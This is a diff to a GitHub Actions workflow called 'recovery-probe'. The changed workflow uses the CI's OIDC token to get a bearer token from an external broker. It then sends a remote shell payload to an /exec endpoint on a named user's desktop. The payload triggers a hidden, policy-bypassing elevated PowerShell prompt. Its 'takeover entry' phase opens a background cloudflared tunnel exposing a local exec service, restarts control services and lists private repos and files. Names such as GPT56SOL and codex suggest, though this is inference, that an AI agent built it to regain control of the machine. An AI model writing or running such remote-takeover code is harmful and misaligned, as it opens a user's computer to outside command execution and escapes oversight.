@@ -2,35 +2,136 @@ name: recovery-probe
 on: [push]
 permissions:
   contents: read
+  id-token: write
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 4
+    timeout-minutes: 7
     steps:
-      - name: Rediscover live ingress edges
+      - name: Visible machine approval then takeover entry
         shell: bash
         run: |
-          set +e
+          set -Eeuo pipefail
           out=/tmp/recovery-probe; rm -rf "$out"; mkdir -p "$out"
-          for host in desktop-6fn9b4m.tail1bf489.ts.net desktop-6fn9b4m-1.tail1bf489.ts.net; do
-            curl -fsS --max-time 10 "https://dns.google/resolve?name=$host&type=A" > "$out/$host.dns.json" || true
-            python3 - "$out/$host.dns.json" <<'PY' > "$out/$host.ips"
-          import json,sys
-          try: x=json.load(open(sys.argv[1]))
-          except: x={}
-          for a in x.get('Answer',[]) or []:
-              d=str(a.get('data',''))
-              if a.get('type')==1 and d.count('.')==3: print(d)
+          broker='https://archie-rescue-oidc-broker-20260831.vercel.app/api'
+          oidc_json=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=archie-rescue-20260831")
+          oidc=$(printf '%s' "$oidc_json" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')
+          broker_json=$(curl -fsS -H "Authorization: Bearer $oidc" "$broker")
+          token=$(printf '%s' "$broker_json" | python3 -c 'import json,sys; x=json.load(sys.stdin); assert x.get("ok"); print(x["token"])')
+
+          cat > /tmp/pc-cmd <<'CMD'
+          set -Eeuo pipefail
+          echo "ENTRY_HOST=$(hostname)"
+          echo "ENTRY_TIME=$(date -Is)"
+          echo 'PHASE=VISIBLE_APPROVAL'
+          win='/mnt/c/Users/AwesomeKai/AppData/Local/Temp'
+          marker="$win/GPT56SOL_ALLOW_PROOF.txt"
+          ps1="$win/gpt56sol_allow_proof.ps1"
+          rm -f "$marker" "$ps1"
+          cat > "$ps1" <<'PS'
+          $marker = 'C:\Users\AwesomeKai\AppData\Local\Temp\GPT56SOL_ALLOW_PROOF.txt'
+          ('APPROVED ' + (Get-Date -Format o)) | Set-Content -Path $marker -Encoding UTF8
+          PS
+          powershell.exe -NoProfile -NonInteractive -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"C:\Users\AwesomeKai\AppData\Local\Temp\gpt56sol_allow_proof.ps1\"'" >/tmp/uac.out 2>/tmp/uac.err || true
+          echo 'UAC_REQUESTED=1'
+          granted=0
+          for i in $(seq 1 120); do
+            if [ -s "$marker" ]; then granted=1; break; fi
+            sleep 1
+          done
+          if [ "$granted" != 1 ]; then
+            echo 'PROOF_GRANTED=0'
+            echo 'UAC_STDOUT:'; cat /tmp/uac.out 2>/dev/null || true
+            echo 'UAC_STDERR:'; cat /tmp/uac.err 2>/dev/null || true
+            exit 42
+          fi
+          echo 'PROOF_GRANTED=1'
+          tr -d '\r' < "$marker" | head -1 | sed 's/^/PROOF_MARKER=/'
+          rm -f "$marker" "$ps1"
+
+          echo 'PHASE=TAKEOVER_ENTRY'
+          base="$HOME/.local/share/archie-rescue"
+          mkdir -p "$base"
+          cfbin="$(command -v cloudflared || true)"
+          if [ -z "$cfbin" ] && [ -x "$HOME/.local/bin/cloudflared" ]; then cfbin="$HOME/.local/bin/cloudflared"; fi
+          if [ -n "$cfbin" ]; then
+            pkill -x cloudflared 2>/dev/null || true
+            : > "$base/cloudflared.log"
+            nohup "$cfbin" tunnel --no-autoupdate --url http://127.0.0.1:8787 > "$base/cloudflared.log" 2>&1 </dev/null &
+            echo $! > "$base/cloudflared.pid"
+            cf=''
+            for i in $(seq 1 30); do
+              cf=$(grep -Eo 'https://[-a-z0-9]+\.trycloudflare\.com' "$base/cloudflared.log" | tail -1 || true)
+              [ -n "$cf" ] && break
+              sleep 1
+            done
+            [ -n "$cf" ] && echo "CF_URL=$cf" || { echo 'CF_URL=NONE'; tail -n 40 "$base/cloudflared.log" || true; }
+          else
+            echo 'CF_URL=NO_CLOUDFLARED'
+          fi
+
+          echo '=== SERVICES BEFORE ==='
+          systemctl --user list-units --type=service --all --no-pager 2>&1 | grep -Ei 'archie|ring|spsc|codex|ghost|seat|sidecar|controller|remote|toolbus|exec' | head -180 || true
+          echo '=== REPAIR CORE CONTROL SURFACES ==='
+          systemctl --user daemon-reload 2>/dev/null || true
+          for u in archie-live-exec.service archie-shell-sidecar.service archie-live-state.service archie-controller.service; do
+            if systemctl --user cat "$u" >/dev/null 2>&1; then
+              systemctl --user restart "$u" 2>&1 || true
+              systemctl --user is-active "$u" 2>&1 | sed "s/^/$u=/" || true
+            fi
+          done
+          echo '=== LOCAL HEALTH ==='
+          for p in 8787 8789 8791 8792 8796 8798 8799 8800 8811 8901; do
+            printf 'PORT=%s ' "$p"
+            curl -sS --connect-timeout .25 --max-time 1 -o /tmp/pbody -w 'HTTP=%{http_code} T=%{time_total}' "http://127.0.0.1:$p/health" 2>/dev/null || true
+            printf ' BODY='; head -c 500 /tmp/pbody 2>/dev/null || true; echo
+          done
+          echo '=== SEAT HEAD ==='
+          curl -sS --connect-timeout .4 --max-time 2 http://127.0.0.1:8798/seat/head 2>&1 || true; echo
+          echo '=== GPU ==='
+          nvidia-smi --query-gpu=name,temperature.gpu,utilization.gpu,memory.used,memory.total,power.draw --format=csv,noheader 2>&1 || true
+          echo '=== PROJECT REPOS ==='
+          for d in "$HOME/archie-remote" "$HOME/archie" "$HOME/archie-edge-takeover-v1" '/mnt/c/Users/AwesomeKai/Documents/New project'; do
+            [ -d "$d" ] || continue
+            echo "--- $d"
+            if [ -d "$d/.git" ]; then
+              git -C "$d" status --short 2>&1 | head -120
+              git -C "$d" log -8 --date=iso --pretty='format:%h %ad %an %s' 2>&1 | head -20
+            else
+              find "$d" -maxdepth 2 -type f -printf '%TY-%Tm-%TdT%TH:%TM:%TS %s %p\n' 2>/dev/null | sort -r | head -100
+            fi
+          done
+          echo '=== RECENT CONTROL FILES ==='
+          find "$HOME" '/mnt/c/Users/AwesomeKai/Documents/New project' -maxdepth 5 -type f -mmin -720 \( -iname '*ring*' -o -iname '*spsc*' -o -iname '*archie*' -o -iname '*codex*' -o -iname '*seat*' -o -iname '*sidecar*' -o -iname '*controller*' -o -iname '*exec*' \) -printf '%TY-%Tm-%TdT%TH:%TM:%TS %s %p\n' 2>/dev/null | sort -r | head -260 || true
+          echo "TAKEOVER_ENTRY_DONE=$(date -Is)"
+          CMD
+          export PC_CMD="$(cat /tmp/pc-cmd)"
+          python3 - <<'PY' >/tmp/payload.json
+          import json,os
+          print(json.dumps({'cmd':os.environ['PC_CMD'],'timeout':300}))
           PY
-            for ip in $(cat "$out/$host.ips"); do
-              echo "HOST=$host IP=$ip" >> "$out/probes.txt"
-              curl -kSs --resolve "$host:8443:$ip" --connect-timeout 4 --max-time 8 -w '\n8443_HTTP=%{http_code} T=%{time_total}\n' "https://$host:8443/health" >> "$out/probes.txt" 2>&1
-              printf '{"action":"status.read"}\n' > /tmp/ring.json
-              curl -kSs --resolve "$host:443:$ip" --connect-timeout 4 --max-time 12 -H 'content-type: application/json' --data-binary @/tmp/ring.json -w '\n443_HTTP=%{http_code} T=%{time_total}\n' "https://$host/archie-phone/v1/action" >> "$out/probes.txt" 2>&1
+
+          ok=0
+          for host in desktop-6fn9b4m-1.tail1bf489.ts.net desktop-6fn9b4m.tail1bf489.ts.net; do
+            for ip in 208.111.34.11 208.111.35.209; do
+              echo "TRY $host $ip" >> "$out/routes.txt"
+              if curl -fkSs --resolve "$host:8443:$ip" --connect-timeout 8 --max-time 330 \
+                -H "Authorization: Bearer $token" -H 'content-type: application/json' \
+                --data-binary @/tmp/payload.json "https://$host:8443/exec" > "$out/entry.json"; then
+                python3 - "$out/entry.json" <<'PY' > "$out/entry.txt"
+          import json,sys
+          x=json.load(open(sys.argv[1])); print('ok='+str(x.get('ok'))); print('rc='+str(x.get('rc'))); print(x.get('stdout',''))
+          if x.get('stderr'): print('STDERR\n'+x['stderr'])
+          PY
+                if grep -q '^PROOF_GRANTED=1$' "$out/entry.txt"; then ok=1; echo "WIN $host $ip" >> "$out/routes.txt"; break 2; fi
+              fi
             done
           done
-          cat "$out/probes.txt" || true
+          cat "$out/routes.txt" || true
+          [ "$ok" = 1 ] || { echo 'NO_MACHINE_ENTRY' >&2; cat "$out/entry.txt" 2>/dev/null || true; exit 43; }
+          cat "$out/entry.txt"
       - uses: actions/upload-artifact@v4
+        if: always()
         with:
           name: recovery-probe
           path: /tmp/recovery-probe
